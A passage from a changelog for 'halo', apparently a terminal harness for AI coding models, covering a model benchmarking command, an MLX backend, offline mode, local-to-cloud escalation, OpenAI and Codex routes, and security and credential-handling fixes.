   `halo gym propose [--apply] [--roles ...] [--main REF]` turns those
   scores into a role-table proposal -- the best LOCAL model per
   supporting role (`small`/`researcher`/`judge`/`subagent_default`),
   weighted per role's own priorities, with the round 5b VRAM-aware rule
   applied to the winner via the existing `roles.vram_aware_override`
   (never a second mechanism); `main` is never touched. One plain
   sentence per role names the composite score behind the choice; `--apply`
   saves the proposal as an ordinary role template through the EXISTING
   `halo roles template import` path. The `/model` picker shows a saved
   gym score (and tok/s) beside a model when one exists. `halo doctor
   --local [--model ol:x]` is the 60-second "works out of the box" proof
   per machine -- load, one real tool call, one structured-output call
   (the same constrained-decoding path the repair loop uses), and one
   summary of a fixture transcript, each printed `[PASS]`/`[FAIL]` with a
   plain reason and the elapsed time, always in that order even after an
   earlier FAIL; docs point a new local-model user at this command first.
   17 new tests (`tests/test_gym_5d.py`, `tests/test_gym_propose_5d.py`,
   `tests/test_doctor_local_5d.py`), hermetic throughout -- never a real
   model.

   Fix pass (2026-10-04, live run on qwen3.8:27b, a thinking-by-default
   model): context recall and instruction adherence scored a flat,
   unexplained 0% -- a 16/32-token output budget left no room for the
   model's own reasoning before the real answer, so the reply came back
   genuinely empty (the NDJSON decoder never turns `message.thinking`
   into checked text in the first place, confirmed with a dedicated
   pin). Both tasks now request a flat 160-token budget; `halo gym
   [show] --show-replies` prints each reply-only task's actual excerpt,
   and the same excerpts are always saved in the result JSON under each
   metric's own `samples` key, so a future 0% is diagnosable without
   re-running anything; the needle check is also now case-insensitive. 5
   more tests pin the thinking/text separation, the new token budget on
   the wire, the tolerant needle match, and the samples/`--show-replies`
   round trip -- live-verified against the real qwen3.8:27b daemon
   (instruction adherence and context recall both went from 0% to 100%).
   Docs: `docs/MODELS.md` ("The model gym" section), `docs/COMMANDS.md`
   (`halo gym`, `halo gym show`, `halo gym propose`, `halo doctor
   --local`), `docs/ROLES.md` ("Data-driven roles"), `docs/
   LOCAL-MODELS.md` (round 6).
7. **`hf:mlx/<org>/<repo>` -- Apple Silicon in-process backend, experimental**
   (round 5f): an optional extra, `uv tool install "halo-harness[mlx]"`
   (`pyproject.toml`'s own `mlx` group, an environment marker restricting
   it to macOS on arm64 -- never attempted on any other platform), adds a
   route that resolves a Hugging Face Hub repo id straight to a Halo-
   managed `mlx_lm.server` on a free loopback port: started with `--model
   <repo>` (mlx-lm downloads/reuses the Hub cache itself on first use; a
   plain notice names the repo, its approximate cached size when known,
   and the cache destination), recorded in round 5c's own managed-server
   registry (`~/.halo/run/local-servers.json`), reused by an EXACT repo-id
   match on every later use (never the generic `hf:local/*` "most
   recently started wins" fallback, which would silently hand a specific
   `hf:mlx/<repo>` ref a DIFFERENT repo's server), stopped when the
   session that started it exits unless kept, and stoppable by hand with
   `halo local stop <repo>`. Rides the EXISTING `hf:local/*` tiers
   end to end (`ModelRef.local=True` alongside the new `ModelRef.mlx=True`):
   tools, the repair loop and constrained decoding, the `small`-by-default
   role, the fit arithmetic, tokens/second, `halo doctor --local --model
   hf:mlx/<repo>`, and `halo gym --models hf:mlx/<repo>,ol:<model>`; on
   any platform that isn't Apple Silicon, resolving the ref gives exactly
   one plain sentence, "MLX runs on Apple Silicon only," and nothing else
   changes (`halo doctor` itself only ever mentions the extra on Apple
   Silicon too). `halo local serve <repo> --runtime mlx_lm` is the
   explicit, non-`--model` form of the same route; the `/local` view
   labels an `mlx-community/*` Hub-cache repo with this exact `hf:mlx/*`
   ref and the explicit `--runtime mlx_lm` serve hint. `doctor_local.py`
   gained a second, provider-agnostic request sender (`providers.
   huggingface_send`, the openai-chat dialect `gym_send.py`'s Ollama-only
   sender has no branch for) so `halo doctor --local` now also accepts an
   `hf:local/*`/`hf:mlx/*` `--model`, not just `ol:`. New tests across
   `tests/test_providers_huggingface_mlx.py`, `tests/test_doctor_local_
   mlx.py`, and `tests/test_huggingface_mlx_extras.py` -- hermetic
   throughout (a fake stub process stands in for `mlx_lm.server`, the
   Apple-Silicon platform check is injectable, and the non-macOS sentence
   is pinned on this suite's own real, non-Apple-Silicon host); the live
   check is the owner running [docs/MAC.md](docs/MAC.md)'s quick-start
   on his own Mac. Docs: `docs/MODELS.md` ("Apple Silicon" section),
   `docs/MAC.md` (the full quick-start), `docs/COMMANDS.md` (`halo local
   serve --runtime mlx_lm`), `docs/LOCAL-MODELS.md` (round 6, with a
   pointer to MAC.md).
8. **Trust and escalation: enforced offline mode, hybrid escalation, saved
   versus cloud** (round 5e): `halo --offline`/`/offline on|off`/
   `network.offline` make the one HTTP choke point (`providers/http.py`'s
   `open_upstream`/`urlopen_tls`) refuse any connection whose host isn't
   loopback or an allow-listed local host (every `ollama.hosts`,
   `huggingface.local_servers`, or managed-local-server-registry entry) --
   update checks, catalog refreshes, the Hugging Face router, OpenRouter,
   Databricks, Anthropic, and the WebFetch/WebSearch tools all refuse the
   same way (one plain sentence, "offline mode: not connecting to
   \<host\>", never retried); the claude.ai connectors bridge's background
   discovery is skipped instead (its real network call runs inside a
   spawned `claude` subprocess, outside this choke point) while an
   explicit `--refresh`/reconnect still runs it. A new invariant test
   greps the tracked tree for every raw `urllib`/`http.client` call site
   and fails on one outside the choke point with no listed, reasoned
   exception (today's exceptions: the MCP SDK's own httpx/websockets
   transport for `http`/`sse`/`ws` MCP servers and `mcp/oauth.py`'s token
   calls -- a separate, user-configured-server concern, not this round's
   scope). **Hybrid escalation** (`routing.escalation`: `{to, when:
   [low_confidence, tool_failures, context_overflow], ask}`) is local-
   first and only ever evaluated on an `ol:`/`hf:local/*`/`hf:mlx/*`
   session: `low_confidence` reuses the EXACT role-resolution + one-shot-
   call shape `roles.small` answers already use, pointed at the `judge`
   role instead (never a new judging mechanism); `tool_failures` counts
   `is_error` tool results in the current turn; `context_overflow` is the
   existing compaction-overflow retry path. `ask: true` (default) only
   notifies; `ask: false` switches for the rest of the turn (the two mid-
   turn triggers) or from the next model call on (`low_confidence`), with
   a transcript note; a role-table entry's own `"escalation": false` turns
   it off per role. `/escalation` shows the policy and this session's last
   decisions. **Saved versus cloud**: the cost meter also prices an `ol:`/
   `hf:local/*`/`hf:mlx/*` turn's tokens against the session's escalation
   target (or, when none is configured, the median price across the
   package's own vendored fallback catalogs -- no network call, works
   identically under `--offline`), accumulating the difference; the status
   bar's cost chip gains a " · saved $x" suffix and `/cost` prints the
   full breakdown (turns, tokens, the reference price and why). Docs:
   `docs/CONFIG.md` (`network.offline`, `routing.escalation`),
   `docs/COMMANDS.md` (`--offline`), `docs/SLASH-COMMANDS.md` (`/offline`,
   `/escalation`, the extended `/cost`), `docs/MODELS.md` (one section
   each), `docs/LOCAL-MODELS.md` (round 6). Manual verification on the
   build host: `halo --offline -p
   "reply with the single word pong" --model ol:qwen3-coder:30b` (loopback,
   succeeds) and the same with `--model or:<any>` (refuses with the plain
   sentence).
9. **`oai:` -- the real OpenAI API, chat completions and a new Responses
   dialect** (round 5i part 1, `docs/harness/OPENAI-RESEARCH.md`):
   `oai:<model>` (group "OpenAI API (key)") against `https://
   api.openai.com/v1`, `OPENAI_API_KEY` auto-enabling it the same way
   every other single-key provider does; `BRIDGE_OPENAI_BASE_URL`/
   `HALO_OPENAI_BASE_URL` overrides the base URL for tests. Chat
   completions (the default) reuses the existing OpenAI-family compat
   profile unchanged; a NEW `openai-responses` dialect (`POST /v1/
   responses`: `instructions` for the system prompt, `input` items
   including `function_call`/`function_call_output` for tool use, tools
   as flat function items, `reasoning: {effort}`, `store: false` and
   NEVER `previous_response_id` -- Halo always keeps owning the
   transcript) is wired into the same three dialect-dispatch points the
   `ollama` dialect uses, plus the small-model and compaction paths,
   selected per model by an exact-id table (`gpt-6-astra`, `gpt-6.1-sol`
   -- exactly the two ids the Responses API reference names as requiring
   it for function calling, confirmed live 2026-10-04; similarly-named
   ids the same page does not name are deliberately left on chat
   completions) and `openai.dialect_overrides` config, either direction.
   Reasoning is carried for display only, never replayed on the wire
   (the documented scope cut: `store:false` rules out
   `previous_response_id`, and encrypted-reasoning-content replay is not
   implemented this round). `GET /v1/models` cached in its own state
   file with a TTL (no price/context on this endpoint, confirmed live --
   those come from a new vendored models.dev `openai` fallback, 53 ids);
   error shapes (401, 429 `insufficient_quota`, 404) need no new mapping
   code at all -- the existing OpenAI-shaped error path already produces
   the real plain sentences, pinned with new tests instead. `/providers`
   says plainly that the OpenAI API has no public balance endpoint for
   ordinary keys and shows computed spend instead; the init wizard gets
   an "OpenAI API (key)" tab (same pattern as Hugging Face's). **No
   OpenAI key exists on the build host -- every behaviour above is
   verified against the parameterized `tests/helpers/mock_openai.py`
   fake only, including a live Read-tool round trip on the Responses
   dialect; unverified against the real API until a key is available.**
   Docs: `docs/MODELS.md` ("OpenAI API" section + the ref-form table),
   `docs/CONFIG.md` (`OPENAI_API_KEY`, `HALO_OPENAI_BASE_URL`, `openai.
   dialect_overrides`), `docs/COMMANDS.md` (`halo doctor`/`halo
   providers`), `docs/LOCAL-MODELS.md` (round 6, marked "verified against
   the fake only until a key is available").
10. **`cx:` -- the Codex subscription route, and Codex settings/AGENTS.md
    read beside Claude Code's** (round 5i part 2, `docs/harness/
    CODEX-RESEARCH.md`): `cx:<model>` (group "Codex subscription
    (ChatGPT)") drives the installed `codex` CLI headlessly under the
    user's own ChatGPT login, mirroring the `cc:` design wherever Codex's
    architecture allows it: detection is the `codex` binary on PATH plus
    `codex login status`'s plain-text answer (never `~/.codex/auth.json`;
    only `"Logged in using ChatGPT"` counts, an API-key/Bedrock/token
    login points at `oai:` instead); short aliases `astra`/`sol`/`luna`
    for the documented ChatGPT-plan ids, reusing the `oai:` route's own
    vendored models.dev catalog for context/output (price is always
    `None` -- a subscription isn't metered). Unlike `cc:` (one held-open
    `claude` process fed one stdin line per turn), `codex exec` has no
    stdin-streaming protocol at all -- each Halo turn spawns a FRESH
    `codex exec [resume <thread-id>] --json <prompt>` subprocess and runs
    it to completion, so steering is a documented fallback (queued, sent
    as its own follow-up `resume` call the moment the current turn ends,
    repeating until nothing is queued, before one `turn_done` closes the
    whole chain) rather than a live mid-turn channel. Codex keeps its own
    native shell/apply_patch tools running in its own sandbox (no flag
    disables them the way `cc:`'s `--tools ""` does) while Halo's own
    tool catalog is ADDITIONALLY exposed through an inline `-c
    mcp_servers.halo.<field>=<value>` override at the SAME bridge `cc:`
    uses -- a native Codex action is logged read-only after the fact, a
    real `mcp_servers.halo` call is dispatched through Halo's own
    permission engine/hooks exactly like every other route's tools; the
    bridge's own token/socket address ride on the subprocess's
    environment, forwarded to the MCP child by name
    (`mcp_servers.halo.env_vars`), never spelled out on Codex's command
    line. Halo's permission mode maps onto `approval_policy`/
    `sandbox_mode`: bypass/auto -> `never`/`danger-full-access`, default
    -> `on-request`/`workspace-write`, manual -> `untrusted`/`read-only`.
    Also reads (never writes) Codex's own `config.toml` (`$CODEX_HOME`
    plus a trusted project's `.codex/config.toml`, a small hand-rolled
    reader -- this repo ships no TOML dependency) and its `AGENTS.md`
    chain (global override-or-plain, then the SAME rule from the git
    root down to cwd, 32 KiB cap -- a DIFFERENT walk than Halo's existing
    CLAUDE.md/AGENTS.md loader, kept deliberately separate) into one
    merged view beside Claude Code's own settings/CLAUDE.md
    (`providers/settings_merge.py`): non-overlapping entries merge (a
    Codex-only MCP server joins the list, its AGENTS.md is its own
    block); overlapping entries follow halo's own config, then Claude
    Code, then Codex, except on a live `cx:` session where Codex's own
    model/reasoning-effort/approval-and-sandbox policy leads;
    `settings.primary: "claude"|"codex"` flips the Claude-Code-vs-Codex
    half of that order. New `/settings [primary claude|codex]` command,
    `halo doctor`'s `codex_settings` line, and the init wizard's
    "Settings sources" step all show/set the same merged view. **No one
    is logged into Codex on the build host -- every behaviour above is
    verified against the parameterized `tests/helpers/fake_codex.py`
    only, including a real MCP tool-call round trip through the bridge
    and the steer-fallback's follow-up `resume` call; unverified against
    the real CLI until a ChatGPT login is available.** Docs:
    `docs/MODELS.md` ("Codex subscription (ChatGPT)" and "Codex settings
    and instructions" sections + the ref-form/alias tables),
    `docs/CONFIG.md` (the Codex-files section, `settings.primary`),
    `docs/COMMANDS.md` (`halo models --cx`, the init wizard tabs/step),
    `docs/SLASH-COMMANDS.md` (`/settings`, the `/providers` row),
    `docs/LOCAL-MODELS.md` (round 6, marked "verified against the fake
    only until a login is available").

### Fixes from the release review

- **`/ollama`/`/local` no longer crash the TUI on first paint**: both dialogs defined a bare `_render()`, shadowing a real Textual internal that returns `None`; renamed to `_render_rows` everywhere.
- **Exit-time stop never kills another session's managed server, or a stale pid the OS reused**: the registry now records an owner pid/start time and the server's own start time, both verified before any signal is sent.
- **KV bytes/token uses the model's real per-head size when it's known**: `key_length`/`value_length` (GGUF/`/api/show`) or config.json `head_dim` now win over the `embedding_length/head_count` approximation that could overcount the fit estimate by up to 2x; `halo local serve -c` is capped by the trained context and the hard cap.
- **The context-overflow retry ceiling can no longer exceed the remote default, the fallback, or the trained context**: a successful retry is remembered for the rest of the session so it isn't repeated every turn; the `FALLBACK_NUM_CTX` placeholder is raised from 8192 to 16384 (below Halo's own measured minimum prompt cost).
- **A local host with no GPU reading gets the same conservative default a remote host gets, not the hard cap**: tightened further to 8192 on a positively CPU-only box; a recorded `does_not_fit` calibration verdict also routes to the fallback instead of being indistinguishable from "nothing known".
- **A learned calibration cap never outranks a smaller live fit estimate**: both now compete in the same `min(...)`, so a cap measured on an idle GPU can no longer force a partial offload once another workload holds some of that VRAM.
- **The constrained-tool-calls gate now recognizes every LAN Ollama host, not just loopback**: keyed on "not Ollama Cloud" (`ollama.com` hostname or an `api_key`) instead of `is_local_host`, for the repair round, `doctor --local`, and the gym.
- **Auto-calibration never blocks a turn past a budget, never runs from `call_small_model`, and never records an unreachable host as permanently "does not fit"**: the measurement now runs in a background thread bounded by the session's own abort and a total wait budget; a host that never answers is reported as "unreachable" and nothing is recorded.
- **Calibration, throughput and capability lookups match `<model>` and `<model>:latest` as one key, everywhere**: the fit-calibration store, the last-turn throughput record, the model picker's capability lookup, and `vram_aware_override`'s same-model check all go through `ollama_names_match` now instead of comparing raw strings, so a cap or throughput reading recorded under either spelling is found by the other.
- **A learned calibration cap is re-measured after a re-pull or an Ollama upgrade**: the on-disk entry's digest/version are now also checked by the auto-calibration gate (not just the live lookup), and the live lookup now checks the server version too, via a per-process-cached `/api/version` probe that costs no extra request after the first turn on a host; a mismatch on either is treated as "no cap at all" instead of a stale measurement standing forever.
- **A bare `hf:local/<model>` resolves to the server that actually serves it**: the managed-server registry (confirmed alive by probing it) and any auto-detected server are checked for an exact match on the model id before ever falling back to "the default server" (previously: whichever server auto-detected first, or started most recently, regardless of what it actually served); a one-line notice names which server was chosen.
- **The managed llama-server now starts with `--alias <model id>`**: its own `/v1/models` id equals the Halo-side name instead of the `-m` file path, so context readback and the model-id resolution above both actually match it; the `/props` single-model-context fallback now only ever applies to a server reporting exactly one model, never broadcast across several.
- **`halo local serve -c` capping verified against the full finding**: already correct as of A-1 (`min(fit_or_trained, trained_context, HARD_CONTEXT_CAP)`); the pinning tests now also cover the hard-cap-wins and nothing-known cases the first pass left unexercised.
- **A partially-offloaded real turn now leaves a trace**: the panel (and `halo ollama`/`halo doctor`, which render through the same function) names `ollama.hosts[].max_ctx` directly beside a learned cap; a real turn that loads offloaded (auto-calibration off, a stale cap, a does-not-fit record, or a retry past the ceiling all reach this) now also records a learned cap from the turn's own `/api/ps` reading and queues the one-sentence notice.
- **A managed server's own readiness wait no longer kills a model that is still downloading or loading**: the budget now scales with the model's own size instead of a fixed 10s (the exact bug that killed `hf:mlx`'s first-use download on every attempt); a child that exits early surfaces its own stderr instead of a generic timeout sentence.
- **`think` is sent only to a model that declares the `thinking` capability, and only when this session's own effort was explicitly set**: a carried `last_effort` from an earlier session, or settings.json's `effortLevel`, no longer turns thinking on by itself (Ollama 400s "does not support thinking" for a model that never declared it); `none`/`minimal` now map to off (gpt-oss: its own lowest graded level) instead of silently mapping to on.
- **Sub-agents resolve their own credentials** (review B1): a child on a
  different route than its parent (an `ol:` or `hf:local` child under an
  `or:` parent, an `oai:` child anywhere) resolves creds for its own model and
  never inherits the parent's key, base URL or custom headers; a child whose
  provider is not configured returns that provider's own "not configured"
  sentence as the tool result instead of sending anything.
- **`/model` never keeps the previous model's credentials** (B2): a switch to
  a ref whose provider is not configured is refused with the provider's own
  sentence (an `hf:mlx/` ref starts its managed server first), and a session
  switch clears stale creds rather than reusing them.
- **`cx:` turns after the first work again** (B3): the sandbox rides as
  `-c sandbox_mode=<mode>` on both `codex exec` and `codex exec resume` (the
  latter has no `-s`), and the fake codex now rejects unknown resume flags the
  way the real one does.
- **The `cx:` prompt travels on stdin** (B4): never on argv, so quoting,
  `%VAR%` expansion and the command-line length limit no longer apply; on
  Windows the npm `.cmd` shim is bypassed in favour of `node <codex.js>` when
  it sits beside the shim.
- **Responses function tools are sent with `strict: false`** (B5), and the
  mock gateway now enforces the strict-schema rules so a regression is caught.
- **`oai:` chat completions have their own profile** (B6):
  `max_completion_tokens`, `stream_options.include_usage`, and
  `reasoning_effort` only on rows the vendored catalog marks as reasoning,
  clamped to the effort values that row lists.
- **Offline mode's allow-list only accepts an actually-local host** (C1): a
  configured `ollama.hosts`/`huggingface.local_servers` entry is allow-listed
  only when its URL is a private/loopback/link-local/ULA IP literal, a bare
  single-label or `.local` name, or the entry carries an explicit
  `offline_ok: true`; `ollama.com` (configured directly, or via an ambient
  `OLLAMA_HOST`) and any other public hostname are now refused under
  `--offline`/`/offline on` with the same plain sentence as any other cloud
  host.
- **A loopback or allow-listed host is never sent through a configured
  proxy** (C2): `HTTPS_PROXY`/`HTTP_PROXY` used to apply even to
  `127.0.0.1` or a LAN Ollama host with nothing exempting them; `open_
  upstream` also re-checks offline mode against the proxy host itself
  before connecting, in case a future change to proxy selection ever lets
  one through again.
- **Every network path now consults `network.offline` before starting**
  (C3): the update check's `git ls-remote`, every `cc:`/`cx:` turn (and
  their one-shot small/judge/title calls), `halo models --cx --refresh`'s
  codex pings, `--plugin-url`'s `git clone`, and `hf:mlx`'s model download
  all skip or refuse with the same plain sentence instead of reaching the
  network while offline; `halo update`'s apply step returns an error result
  instead of running the reinstall command.
- **`ollama.hosts[].api_key`/`huggingface.endpoints[].token`/`huggingface.
  local_servers[].api_key` are no longer stored as plaintext** (C16): a
  saved key now lives in the same shared env file `DATABRICKS_TOKEN`/
  `HF_TOKEN` already use, under a generated name; config.json keeps only
  the reference (`api_key_env`/`token_env`). An existing plaintext value
  still resolves and is migrated to the env file the next time that entry
  is saved; `~/.halo/config.json` is written 0600 on POSIX, and `halo
  config list`/`config get` mask secret-shaped values instead of printing
  them verbatim.
- **Malformed `ollama.hosts`/`huggingface.endpoints`/`huggingface.
  local_servers` entries are logged by name only** (C17): the debug line
  used to log `%r` of the whole entry, key or token included; the shared
  redactor in `redact.py` now also matches a Python-repr single-quoted
  assignment (`'token': '...'`, the shape that logging produced) and the
  `hf_...`/`xpl_...` token shapes.
- **An offline-gated request can no longer be redirected to a disallowed
  host** (C21): `urlopen_tls` only ever checked the first URL; a redirect
  handler now re-runs the same offline check on every hop before following
  it.
- **Hybrid escalation never switches onto a target offline mode would
  itself refuse** (C4): with `network.offline`/`--offline` on, a trigger
  whose `to` resolves to a host the offline allow-list would refuse now
  stays local, logs one line at DEBUG, and shows a plain "held: offline"
  notice instead of silently flipping the session's primary model to one
  every later request would then also be refused for.
- **An auto-switch leaves a real trace** (C5): the escalation card is now
  a permanent transcript line (`system_note`, never just a 5-second toast),
  the status bar's model chip updates immediately instead of waiting for
  whatever the next turn happens to emit, and print mode carries the
  switch in the `-p --output-format json` result's new `escalations`
  field.
- **`tool_failures` only counts real tool errors** (C6): a permission
  denial (an interactive "No", a deny rule, a PreToolUse hook block) or an
  interrupted call no longer counts toward the `>= 2` threshold on its
  own; a schema/repair rejection still does.
- **A role's own `escalation: false` now actually takes effect** (C7):
  `_normalize_role_value`/`configured_role_table()` used to silently drop
  the `escalation` key down to `{model[, effort]}` only, so the per-role
  override (config.json, team.json, or a loaded template) could never
  reach `role_escalation_enabled`; it now survives normalization end to
  end.
- **"Saved versus cloud" stops accruing the instant a session leaves
  local** (C8): `add_savings` is now gated on the CURRENT model being
  local, resolved fresh on every call, instead of only on whether a
  reference price was ever pinned at session start -- an escalation or a
  `/model`/`--fallback-model` switch to a cloud ref stops the figure
  growing immediately, and it resumes with no re-pinning once back on a
  local model.
- **The TUI's "saved $x" chip actually shows up now** (C9):
  `message_end`'s own `saved_usd` field reaches the real `StatusBar`
  through `tui/dispatch.py` for the first time; `Session.status_event()`
  carries it on every status too, not just message_end.
- **A status event without a throughput reading no longer blanks the
  chip** (C10): the three `ollama_*` fields now ride on `events.status()`
  only when the producer actually passes them, the same "presence means a
  reading" rule the MCP count already follows -- an ordinary turn-start/
  turn-end status elsewhere in the loop no longer wipes the "NN tok/s"
  segment back to blank.
- **`/model` can finally pick a local model** (C11):
  `Controller.list_models()` now lists an `Ollama (<host>)` group per
  configured host and `hf:local/*`/`hf:mlx/*` groups for every registered
  local server and `huggingface.model_dirs` file, reusing the exact same
  shared discovery `/local` already uses.
- **The picker's `u` key works from where the cursor actually starts**
  (C12): focus begins on the filter box, which used to swallow a bare "u"
  as text before any binding ever saw it (Textual strips a key the
  focused widget claims from every ancestor's bindings before `priority`
  is even consulted); the filter now forwards it to the role-assignment
  action directly, which reads the ref off the highlighted OptionList row
  instead of the filtered list's same-index entry -- the two could
  disagree the moment a disabled group header sat above it.
- **The VRAM-aware role redirect now applies to real sub-agent spawns,
  not just `/roles`'s own display** (C13): `resolve_agent_model` -- the
  function that actually picks the model for Explore/Researcher, Judge,
  and an unnamed sub-agent -- now runs the same `vram_aware_override`
  check `/roles`/`halo roles`/the escalation judge already use, for a
  table value only, never a CLI `--role` override.
- **`/local add`/`/local forget` work in the TUI** (C14): they used to
  fall straight through to the "answer it as a question" branch and
  persist nothing; now routed through the same `_cmd_local`/
  `add_model_dir`/`forget_model_dir` print mode already uses.
- **Saving the wizard's Ollama tab with every field blank no longer
  overwrites a configured host** (C15): the documented "leave every field
  blank to register the local daemon" flow is now a no-op once any host
  already exists, and a non-blank save MERGES into a same-named entry's
  existing fields (`default`/`max_ctx`/`kv_cache_type`/`ssh`/`keep_alive`)
  instead of replacing it outright.
- **The MCP count never shows a fake "0 connected"** (owner report):
  `Session.status_event`/`Controller._mcp_status` now return no reading at
  all -- rather than `{"connected": 0, "total": 0}` -- when no
  `mcp_status_fn` was ever wired or it failed, so the status bar keeps its
  last real count instead of flashing an empty one; a lazily-cached MCP
  server's first real connect now publishes a fresh status event right
  away, instead of waiting for whatever the next turn happens to emit.
- **The whole gpt-6 and gpt-5.6 families use the Responses dialect** (B7):
  not only `gpt-6-astra`/`gpt-6.1-sol` -- `gpt-6-sol`, `gpt-6-luna`,
  `gpt-5.6`, `gpt-5.6-sol`, `gpt-5.6-luna` and `gpt-5.6-terra` now default to
  `openai-responses` too, so a tool-bearing turn never pays the live-verified
  "Function tools with reasoning_effort are not supported" 400 and its
  retry; the `oai:` chat profile also sets `reasoning_effort_with_tools`
  for the same families (the way the Databricks branch already did), so an
  `openai.dialect_overrides` entry that forces one of them back onto chat
  still sends `reasoning_effort: "none"` on the first request.
- **A compactionModel/small-model override on the SAME provider but a
  different host or key now resolves its own credentials** (B8): the swap
  used to re-resolve creds only when `ref.provider` itself differed, so an
  `ol:small@lan` compactionModel under an `ol:big` (default host) main
  session inherited the main host's creds; both call sites now resolve the
  override ref unconditionally and skip the override entirely (falling back
  to the session's own main model, never the main model's creds under the
  override's body) when nothing resolves.
- **`HALO_OPENROUTER_BASE_URL`/`BRIDGE_OPENROUTER_BASE_URL` never leaks onto
  a non-`or:` request** (B9): the session-level override used to apply to
  every non-Databricks chat route it was still SET for -- an `oai:`/`hf:`
  request built after a `/model` switch, a fallback, an escalation, or a
  sub-agent/small/compaction call away from an `or:` leg of the same session
  went to the OpenRouter override URL with the OpenAI/HF key instead of its
  own provider's real endpoint; `providers/stream.py`'s phase 1 now applies
  it only when the request's own route is actually `openrouter`.
- **`extra_headers` are rebuilt for the route of EACH request** (B10):
  Databricks's `ANTHROPIC_CUSTOM_HEADERS` and the hf: router's
  `X-HF-Bill-To` used to be computed once from the session's STARTING
  model and handed to every later request verbatim -- a `/model` switch,
  a fallback, or a small/compaction-model override onto a different
  provider kept sending them to OpenRouter/Ollama/local servers, and
  switching INTO `dbx:`/the router never gained its own header. Both are
  now recomputed from the actual route of every outgoing request.
- **The Codex approval/sandbox table is keyed on the engine's own six real
  permission modes** (B11): `default|acceptEdits|plan|auto|dontAsk|
  bypassPermissions`, not the pre-engine-name `bypass`/`manual` strings
  `normalize_permission_mode` never actually produces -- every mode but
  `auto` used to fall through to the `default` row by accident, including
  `bypassPermissions`/`dontAsk`/`acceptEdits`/`plan`; each now has its own
  documented `approval_policy`/`sandbox_mode` pair (`plan` is `never`/
  `read-only`, so it never writes at all), matching docs/MODELS.md.
- **A `cx:` prompt is never truncated, confirmed with a dedicated test**
  (B12): B-1's stdin-delivery fix already removed the old "first 20,000
  characters" argv cap along with the argv-embedded prompt itself, but
  nothing pinned the scenario that used to lose the user's own message --
  a 60,000-character carried context (switching INTO `cx:` mid-session)
  plus a short next message now has a test proving the user's text still
  arrives intact at the end of the delivered prompt.
- **`--effort`/`/effort` now reaches `codex exec`** (B13): `cc:` already
  forwarded it, `cx:` silently dropped it -- the status bar and `/effort`
  showed a level Codex never actually received, running on whatever
  `config.toml` said instead. Now rides as its own
  `-c model_reasoning_effort=<value>` on every invocation (a fresh `exec`
  and a `resume` alike), mapped from Halo's harness-wide effort levels
  (which share five of Codex's own six names outright); omitted entirely
  when no effort is set.
- **A `codex` one-shot call that times out no longer leaves anything
  running** (B14): the one-shot `cx:` small-model call, the synchronous
  `codex login status` preflight on a session's first turn, `halo models
  --cx --refresh`'s per-alias pings and the `--version` check all spawned
  the binary with a plain `subprocess.run(..., timeout=...)`, whose own
  timeout only reaches the ONE resolved process -- on Windows that is
  often an npm `.cmd` shim or a `node` launcher, never the real work
  beneath it, so `communicate()` kept blocking on a still-running
  grandchild past the timeout (verified: an 8s child outlived a 2s
  timeout by 6.1s). A shared bounded-subprocess helper now isolates each
  call in its own process group with `stdin=DEVNULL` and kills the WHOLE
  tree on a timeout (`taskkill /T /F` on Windows, `killpg` on POSIX),
  draining any buffered output so nothing is left as a zombie.
- **No 2.0.3 provider secret reaches a tool child's environment** (B15):
  the fixed strip list named only pre-2.0.3 keys, so `HF_TOKEN`,
  `OPENAI_API_KEY`, `OLLAMA_API_KEY` and the Experiential Labs keys
  reached every Bash/PowerShell/MCP/hook child, from the shell or a
  settings env, unlike `OPENROUTER_API_KEY`/`ANTHROPIC_API_KEY`; the
  `cx:` route's own child env now also strips `OPENAI_*`/`CODEX_API_KEY`
  (Codex's own documented API-key billing path) the way it already strips
  `ANTHROPIC_*`/`CLAUDE*`, so a `cx:` session can no longer silently bill
  a key instead of running on the ChatGPT subscription.
- **`/models refresh`, `halo models --refresh` and the background catalog
  worker now refresh the OpenAI catalog too** (B16): `refresh_openai_
  catalog_if_stale` had no caller anywhere -- a key from the shell or env
  file (never run through the init wizard's own OpenAI tab, the only
  other writer of `openai-models.json`) never got a picker group, and an
  init-written cache was never refreshed again. Wired into the same four
  surfaces OpenRouter/Anthropic/Databricks already use: the TUI's launch
  and `/model`-open background worker, the TUI's `/models [refresh]`
  command, and the headless `/models`/`halo models --refresh` commands.
- **Offline mode for `cc:`/`cx:` turns, confirmed covered on both turn
  paths** (B17): C-1 already added the gate (`_preflight_cc`/
  `_preflight_cx`, both one-shot small/judge/title calls, and `halo
  models --cx --refresh`'s pings) and docs/CONFIG.md already describes
  it; the two tests pinning the `cx:` one-shot call and catalog refresh
  were repaired to stub the new bounded-subprocess helper (B14) instead
  of the `subprocess.run` call it replaced, so both turn paths stay
  genuinely covered rather than silently passing on a stub nothing
  reaches any more.
- **No more "MAXIMUM STEPS REACHED" at 50 tool calls** (rolo, 2026-10-05):
  `--max-turns` defaulted to 50 and the TUI applied it to interactive
  sessions, so any long task stopped mid-stream with a handoff summary.
  Claude Code only caps print mode and only when asked; Halo now matches:
  no cap anywhere unless `--max-turns N` is passed (a non-positive value
  also means no cap). The identical-call breaker and the cost/context
  meters remain the runaway guards.
- **`/ollama` and `/local` refresh results arriving after the dialog is gone
  are dropped, never raised**: a refresh worker whose dialog was dismissed
  (or whose app was already exiting) used to raise NoActiveAppError out of
  the worker; both dialogs now hand results to the UI thread through a
  guard that ignores that case.

## [2.0.2] - 2026-10-04

W7 rounds 1-7 of the 2.0.2 brief (F, A, B, C, D, E, then the init wizard):
the terminal tab title fix, roles v2, organizations, sub-agent visibility
and scale, MCP repair actions, Qwen tool calling at work, `halo update`,
and one init wizard with Back/Skip/Next buttons plus Roles/Organizations
setup screens.

1. **Terminal tab title stays `halo`**: root cause confirmed by reading
   every `claude`-spawning call site -- each one pipes the child's stdout/
   stderr for its own parsing but never detaches it from the shared
   console/tty, and a real `claude` binary sets the console/terminal title
   itself at startup through a side channel independent of those redirected
   handles (Windows: the console title is a property of the console object
   any attached process can set, regardless of its own stdout; POSIX: an
   OSC 2 write most terminals honour however it arrives) and never restores
   it -- while Textual's own `BridgeApp.TITLE` has never touched the real
   terminal at all (it's only ever the in-app Header widget's text).
   `halo_harness.termtitle` (new) re-asserts `halo` via OSC 2 plus, on
   Windows, a `SetConsoleTitleW` fallback for legacy `conhost`: at TUI
   start and on `/resume`, after every `claude` child exits
   (`agent/cc_process.py`, `providers/cc_models.py`'s probes, `mcp/
   connectors.py`'s discovery), and once more on the drain tick that
   follows one, as insurance. Print mode (`-p`) saves whatever title was
   there at start and restores it at exit; the OSC 2 write itself is
   skipped on a non-interactive default stdout (never spliced into a
